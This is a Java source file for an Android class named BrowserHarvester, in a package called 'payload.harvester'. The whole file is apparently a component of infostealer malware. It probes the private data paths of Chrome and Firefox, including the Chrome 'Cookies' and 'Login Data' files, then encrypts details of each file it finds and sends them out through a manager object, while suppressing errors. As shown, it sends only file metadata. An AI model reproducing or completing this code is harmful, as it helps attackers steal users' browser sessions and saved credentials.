package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;
import com.chameleon.payload.util.Crypto;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;

public class BrowserHarvester {
    private static final String TAG = "BrowserHarvester";
    private final Context context;
    private final HarvesterManager manager;

    public BrowserHarvester(Context context, HarvesterManager manager) {
        this.context = context;
        this.manager = manager;
    }

    public void collectBrowserData() {
        Log.i(TAG, "Collecting browser data...");
        try {
            collectFromPath("/data/data/com.android.chrome/app_chrome/Default/");
            collectFromPath("/data/data/org.mozilla.firefox/files/mozilla/");
            collectFromPath("/data/data/com.android.chrome/app_chrome/Default/Cookies");
            collectFromPath("/data/data/com.android.chrome/app_chrome/Default/Login Data");
        } catch (Exception e) {
            Log.e(TAG, "Browser data collection error", e);
        }
    }

    private void collectFromPath(String path) {
        try {
            File file = new File(path);
            if (file.exists()) {
                JSONObject data = new JSONObject();
                data.put("path", path);
                data.put("size", file.length());
                data.put("exists", true);
                byte[] encrypted = Crypto.encrypt(data.toString().getBytes());
                manager.sendData("session", encrypted);
                Log.d(TAG, "Found browser data: " + path);
            }
        } catch (Exception ignored) {}
    }
}
